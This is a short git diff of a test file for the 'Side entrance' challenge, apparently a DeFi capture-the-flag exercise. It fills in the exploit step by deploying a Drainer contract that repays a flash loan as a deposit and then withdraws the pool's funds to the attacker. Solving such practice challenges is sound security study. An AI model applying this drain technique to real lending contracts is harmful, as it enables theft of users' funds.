@@ -2,6 +2,7 @@ const { ether, balance } = require('@openzeppelin/test-helpers');
 const { accounts, contract } = require('@openzeppelin/test-environment');
 
 const SideEntranceLenderPool = contract.fromArtifact('SideEntranceLenderPool');
+const Drainer = contract.fromArtifact("Drainer");
 
 const { expect } = require('chai');
 
@@ -25,7 +26,10 @@ describe('[Challenge] Side entrance', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // return the flashloan through a deposit that can be withdrawn later
+        this.drainer = await Drainer.new(this.pool.address, { from: attacker });
+        await this.drainer.attack({ from: attacker });
+        await this.drainer.withdraw(attacker, { from: attacker });
     });
 
     after(async function () {
